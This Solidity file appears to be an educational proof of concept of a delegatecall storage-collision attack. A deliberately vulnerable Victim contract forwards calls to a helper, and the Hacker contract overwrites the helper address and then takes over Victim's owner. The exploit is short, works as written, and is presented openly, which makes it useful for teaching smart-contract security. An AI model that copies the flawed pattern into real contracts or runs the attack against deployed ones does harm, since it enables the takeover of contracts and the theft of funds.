// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.9;

contract Victim {
    address public helper;
    address public owner;

    constructor(address _helper) {
        helper = _helper;
        owner = msg.sender;
    }

    function setNum(uint _num) public {
        helper.delegatecall(abi.encodeWithSignature("setNum(uint256)", _num));
    }
}

contract Helper {
    uint public num;

    function setNum(uint _num) public {
        num = _num;
    }
}

contract Hacker {
    address public helper;
    address public owner;
    uint256 public num;

    Victim public victim;

    constructor(Victim _victim) {
        victim = Victim(_victim);
    }

    function setNum(uint256 _num) public {
        owner = msg.sender;
    }

    function attack() public {
        victim.setNum(uint256(uint160(address(this))));
        victim.setNum(1);
    }
}
